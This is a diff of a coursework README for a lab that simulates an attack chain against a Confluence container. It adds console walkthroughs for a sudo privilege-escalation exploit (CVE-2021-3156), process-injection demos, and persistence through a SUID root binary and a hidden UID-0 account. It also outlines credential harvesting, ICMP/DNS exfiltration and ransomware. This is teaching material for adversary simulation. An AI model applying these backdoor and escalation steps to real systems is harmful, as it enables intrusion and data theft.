@@ -14,8 +14,8 @@
 
 ## MITRE ATT&CK Techniques Chosen
 - Initial Access - `Exploit Public-Facing Application`
-- Privilege Escalation - `Exploit Low Privileged User Shell`
-- Persistence - `Exploit Suid Binary file`
+- Privilege Escalation - `Exploit Buffer Overflow`
+- Persistence - `Exploit SUID Binary File`
 - Credential Access - `Unsecured Credentials`
 - Collection & Exfiltration - `lorem ipsum`
 - Impact - `Ransomware`
@@ -40,29 +40,29 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
 
 # Usage 
-### Table of contents
+### Table of Contents
   - [Part 1 - Spinning up the Infrastructure](#part-1---spinning-up-the-infrastructure)
     - [Quick Commands](#quick-commands)
   - [Part 2 - Logs, Dashboards and Services](#part-2---logs-dashboards-and-services)
-    - [Confluence - Attack target](#confluence---attack-target)
+    - [Confluence - Attack Target](#confluence---attack-target)
     - [Kibana(ELK) Dashboard](#kibanaelk-dashboard)
   - [Part 3 - Attack Vector and Exploits](#part-3---attack-vector-and-exploits)
-  - [Automation](#automation)
-  - [Initial Access](#initial-access)
-    - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
-  - [Privilege Escalation](#privilege-escalation)
-    - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
-  - [Persistence](#persistence)
-    - [Persistence using Suid Binary](#persistence-using-suid-binary)
-  - [Credential Access](#credential-access)
-    - [DumpsterDiver](#dumpsterdiver)
-    - [LaZagne](#lazagne)
-    - [linPEAS](#linpeas)
-  - [Exfiltration](#exfiltration)
-    - [Exfiltrate data over ICMP](#exfiltrate-data-over-icmp)
-    - [Exfiltrate data over DNS](#exfiltrate-data-over-dns)
-  - [Impact](#impact)
-    - [Ransomware Payload](#ransomware-payload)
+    - [Automation](#automation)
+    - [Initial Access](#initial-access)
+      - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
+    - [Privilege Escalation](#privilege-escalation)
+      - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
+    - [Persistence](#persistence)
+      - [Persistence using Suid Binary](#persistence-using-suid-binary)
+    - [Credential Access](#credential-access)
+      - [DumpsterDiver](#dumpsterdiver)
+      - [LaZagne](#lazagne)
+      - [linPEAS](#linpeas)
+    - [Exfiltration](#exfiltration)
+      - [Exfiltrate data over ICMP](#exfiltrate-data-over-icmp)
+      - [Exfiltrate data over DNS](#exfiltrate-data-over-dns)
+    - [Impact](#impact)
+      - [Ransomware Payload](#ransomware-payload)
 
 ## Part 1 - Spinning up the Infrastructure
 1. Ensure Docker Engine is **running**
@@ -106,7 +106,7 @@ HOST-MACHINE@HOST $ vagrant halt
 
 ## Part 2 - Logs, Dashboards and Services
 
-### Confluence - Attack target
+### Confluence - Attack Target
 - Simulated Network - `10.0.0.3`
 - Testing and User Access - [`http://127.0.0.1:80`](http://127.0.0.1:80)
 
@@ -137,7 +137,7 @@ Available configured attacks: `initialaccess` `privesc` `persistence` `credentia
 
     <img src="https://user-images.githubusercontent.com/1593214/197329877-ef4c952d-2de8-49e2-84ab-fde8a30edea3.png" width="512">
 
-##### Proof-of-concept 
+##### Proof-of-Concept 
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess
 ==> kali: Running provisioner: initialaccess (shell)...
@@ -145,7 +145,7 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess
     kali: confluence@confluence:/opt/atlassian/confluence/bin$ exit
 HOST-MACHINE@HOST $
 ```
-##### Reverse Shell access
+##### Reverse Shell Access
 ```console
 HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
 root@kali # cd /tmp/1_InitialAccess
@@ -164,9 +164,35 @@ https://github.com/CptGibbon/CVE-2021-3156
 - Vulnerability exploitation allows low privileged users to gain root privileges
 - Privilege escalation via "sudoedit -s" and a command-line argument that ends with a single backslash character
 
+##### Running CVE-2021-3156 Exploit
+```console
+root@confluence:/# su confluence
+confluence@confluence:/$ cd /vagrant/attack/2_PrivilegeEscalation
+confluence@confluence:/vagrant/attack/2_PrivilegeEscalation$ ./demo_1_cve.sh
+root@confluence:/tmp/pe/CVE-2021-3156#
+```
+
 #### KK5 Linux Process Injection Utility
 [KK5](https://github.com/josh0xA/K55) is a linux payload injection tool that is used for injecting x86_64 shellcode payloads into running processes.
 
+##### Continuing from Exploited Root Shell (Terminal 1)
+```console
+root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
+root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_2_process_injection.sh
+root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_2_process_injection.sh
+```
+
+##### Running a 2nd Exploited Root Shell (Terminal 2)
+```console
+root@confluence:/# su confluence
+confluence@confluence:/$ cd /tmp/pe/CVE-2021-3156
+confluence@confluence:/tmp/pe/CVE-2021-3156$ ./exploit
+root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
+root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_3_process_injection.sh
+root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_3_process_injection.sh
+```
+
+#### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with privesc 
 ```
@@ -175,11 +201,11 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with privesc
 
 
 ### Persistence
-#### Persistence using Suid Binary
+#### Persistence Using SUID Binaries
 - After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
 - Allows attacker to regain root privileges from low privileged user account.
     
-#### Setup
+##### Setup
 ```console
 root@confluence:/# cd /tmp
 root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
@@ -189,14 +215,14 @@ root@confluence:/tmp# gcc suid.c -o suid
 root@confluence:/tmp# chmod 7111 suid
 root@confluence:/tmp# rm suid.c
 ```
-#### Regain
+##### Regain
 ```console
 confluence@confluence:/tmp$ ./suid
 whoami
 root
 ```
 
-### Persistence using account
+#### Persistence Using Account
 - After gaining root access via privilege escalation, create root privileges account.
 - Allows attacker to regain root privileges by accessing the account.
 
@@ -204,7 +230,7 @@ root
 root@confluence:/tmp# useradd -ou 0 -g 0 systemd
 root@confluence:/tmp# chpasswd <<<"systemd:systemd"
 ```
-Regain
+##### Regain
 ```console
 confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
 confluence@confluence:/tmp$ python /tmp/shell.py
@@ -215,7 +241,8 @@ Password: systemd
 whoami
 root
 ```
-	
+
+#### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
 ```
@@ -233,6 +260,7 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with persistence
 #### linPEAS
 [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux. Its functionalities include searching for possible passwords inside all the accessible files of the system and bruteforcing users with top 2000 passwords.
 
+#### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with credentialaccess 
 ```
@@ -243,9 +271,9 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with credentialaccess
 
 
 ### Exfiltration
-#### Exfiltrate data over ICMP
+#### Exfiltrate Data Over ICMP
 https://github.com/ariary/QueenSono
-#### Exfiltrate data over DNS
+#### Exfiltrate Data Over DNS
 https://github.com/m57/dnsteal
 
 - Collected files are tar-ed from the Confluence server sent to the attacker server via ICMP and DNS
@@ -253,6 +281,7 @@ https://github.com/m57/dnsteal
 - Files received by the attacker can be found at `/tmp/qs/` (ICMP) and `/tmp/dnsteal/` (DNS)
 - Data is exfiltrated to the attacker at X minute intervals (currently set to 1).
 
+#### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with exfil 
 ```
@@ -272,6 +301,7 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with exfil
   - All files found will be encrypted with the public key.
   - All encrypted files will have a new extension `.r4ns0m3`.
 
+#### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with ransom 
 ```
